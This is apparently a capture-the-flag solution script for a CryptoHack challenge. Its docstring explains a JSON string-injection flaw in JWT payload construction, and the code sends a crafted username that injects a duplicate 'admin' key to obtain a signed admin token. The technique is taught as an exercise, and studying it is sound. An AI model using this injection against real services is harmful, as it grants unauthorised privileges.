"""
JSON in JSON (50pts) — JWT / JSON string injection

The `create_session` endpoint builds the JWT payload via raw string
concatenation, with no escaping on `username`:

    body = '{' + '"admin": "' + "False" + '", "username": "' + username + '"}'
    encoded = jwt.encode(json.loads(body), SECRET_KEY, algorithm='HS256')

If we supply username = `x", "admin": "True`, the body becomes

    {"admin": "False", "username": "x", "admin": "True"}

`json.loads` parses duplicate keys keeping the LAST occurrence, so the
decoded payload is `{"admin": "True", "username": "x"}`. The server
signs it legitimately for us. Submit to /authorise/ → flag.

Note the server checks `decoded["admin"] == "True"` as a STRING (not bool).
"""
import requests
import urllib.parse

BASE = "https://web.cryptohack.org/json-in-json"

PAYLOAD = 'x", "admin": "True'  # username-with-injection


def main():
    # URL-encode the injection into the URL path
    u = urllib.parse.quote(PAYLOAD, safe="")
    r = requests.get(f"{BASE}/create_session/{u}/", timeout=15)
    print(f"[1] session response: {r.json()}")
    token = r.json()["session"]
    print(f"    token: {token}")

    r = requests.get(f"{BASE}/authorise/{token}/", timeout=15)
    print(f"[2] authorise: {r.json()}")


if __name__ == "__main__":
    main()
